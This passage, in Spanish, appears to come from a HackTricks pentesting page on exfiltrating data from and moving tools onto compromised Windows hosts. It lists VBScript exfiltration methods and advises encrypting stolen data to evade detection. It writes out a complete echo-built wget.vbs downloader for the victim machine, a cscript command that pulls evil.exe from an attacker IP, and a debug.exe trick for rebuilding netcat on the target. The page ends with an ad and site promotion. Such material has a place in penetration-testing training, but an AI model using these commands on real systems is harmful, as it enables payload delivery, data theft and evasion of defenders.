1. **Transferencia de archivos**: VBScript puede ser utilizado para copiar archivos desde el sistema comprometido hacia un servidor controlado por el atacante. Esto se puede lograr utilizando comandos como `CopyFile` o `MoveFile` para transferir archivos a través de la red.

2. **Envío de datos por correo electrónico**: VBScript también puede ser utilizado para enviar datos confidenciales por correo electrónico. Esto se puede lograr utilizando la biblioteca `CDO.Message` para crear y enviar mensajes de correo electrónico desde el sistema comprometido hacia una dirección de correo controlada por el atacante.

3. **Transmisión de datos a través de HTTP**: VBScript puede ser utilizado para enviar datos a través de solicitudes HTTP. Esto se puede lograr utilizando la biblioteca `MSXML2.XMLHTTP` para enviar datos a un servidor controlado por el atacante utilizando el método `POST`.

Es importante tener en cuenta que la exfiltración de datos utilizando VBScript puede ser detectada por soluciones de seguridad y firewalls. Por lo tanto, es importante tomar medidas adicionales para ocultar o cifrar los datos exfiltrados y evitar la detección.

### Recursos adicionales

- [Documentación oficial de Microsoft sobre VBScript](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/scripting-articles/d1wf56tt(v=vs.84))
- [Ejemplos de código VBScript](https://www.w3schools.com/asp/asp_ref_vbscript_functions.asp)
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Víctima**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Esta es una técnica loca que funciona en máquinas Windows de 32 bits. La idea es utilizar el programa `debug.exe`. Se utiliza para inspeccionar binarios, como un depurador. Pero también puede reconstruirlos a partir de hexadecimal. Entonces la idea es tomar binarios, como `netcat`. Y luego desensamblarlo en hexadecimal, pegarlo en un archivo en la máquina comprometida y luego ensamblarlo con `debug.exe`.

`Debug.exe` solo puede ensamblar 64 kb. Por lo tanto, necesitamos utilizar archivos más pequeños que eso. Podemos usar upx para comprimirlo aún más. Así que hagámoslo:
```
upx -9 nc.exe
```
Ahora solo pesa 29 kb. Perfecto. Ahora vamos a desensamblarlo:
```
wine exe2bat.exe nc.exe nc.txt
```
Ahora simplemente copiamos y pegamos el texto en nuestra ventana de comandos de Windows. Y automáticamente creará un archivo llamado nc.exe

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra las vulnerabilidades que más importan para que puedas solucionarlas más rápido. Intruder rastrea tu superficie de ataque, realiza escaneos de amenazas proactivas, encuentra problemas en toda tu pila tecnológica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
